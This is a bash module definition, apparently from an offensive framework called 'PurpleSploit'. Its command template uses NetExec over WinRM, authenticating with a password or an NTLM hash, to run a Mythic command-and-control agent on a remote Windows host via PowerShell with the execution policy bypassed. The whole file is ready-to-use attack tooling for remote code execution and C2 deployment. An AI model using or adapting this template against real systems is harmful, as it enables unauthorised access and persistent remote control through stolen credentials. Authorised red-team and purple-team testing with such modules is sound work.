#!/bin/bash
# Mythic Agent Deployment via WinRM

MODULE_NAME="c2/mythic/deploy_winrm"
MODULE_CATEGORY="c2"
MODULE_DESCRIPTION="Deploy Mythic agent via WinRM using NXC"
MODULE_AUTHOR="PurpleSploit Team"
MODULE_TOOL="mythic"

REQUIRED_VARS="RHOST,USERNAME,MYTHIC_PAYLOAD"
OPTIONAL_VARS="PASSWORD:,DOMAIN:,HASH:"

COMMAND_TEMPLATE="nxc winrm \${RHOST} -u \${USERNAME} -p '\${PASSWORD}' \${DOMAIN:+-d \$DOMAIN} \${HASH:+-H \$HASH} -x 'powershell -ExecutionPolicy Bypass -File \${MYTHIC_PAYLOAD}'"
